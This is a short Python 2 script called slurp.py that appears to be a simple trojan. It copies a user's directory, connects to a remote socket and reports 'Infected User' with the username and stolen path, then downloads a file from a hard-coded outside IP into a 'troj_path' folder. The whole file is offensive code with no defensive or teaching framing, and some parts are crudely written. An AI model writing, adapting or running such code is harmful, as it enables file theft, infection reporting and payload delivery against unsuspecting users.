#!/usr/bin/env python
# -*- slurp.py -*-
# Script to slurp out files
# <3<3<3<3<3<3<3<3<3

import os, sys
import getpass
import socket
import urllib
import shutil

web = "http://86.247.205.102"
troj_path = "/home/lemon/Download"

class slurper():
	'Main slurp'

	def __init__(self, path, ip, port, net=True):
		self.path = path
		self.ret_path = getpass.getuser() + "/"
		self.ip = ip
		self.port = port
		self.net = net
		if self.net == True:
			self.s = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
			self.s.connect((ip, port))
		
		if os.path.exists(self.path) == False:
			print "[!!!] Path does not exists Error"
			print "[...] Watch out they might be a syntax error"
			sys.exit(-1)

	def run(self):
		#main func
		shutil.copytree(self.path, self.ret_path)
		if self.net == True:
			self.s.send(u"Infected User : " + getpass.getuser() + "\n" + 
			"Downloaded : "  + self.path + "\n")
			self.s.close
			urllib.urlretrieve(web, troj_path)



#logic code execution, if single script always True but if in lib
#False.
if __name__ == "__main__":
	slp = slurper("/home/lemon/Documents/python", "127.0.0.1", 8080)
	slp.run()
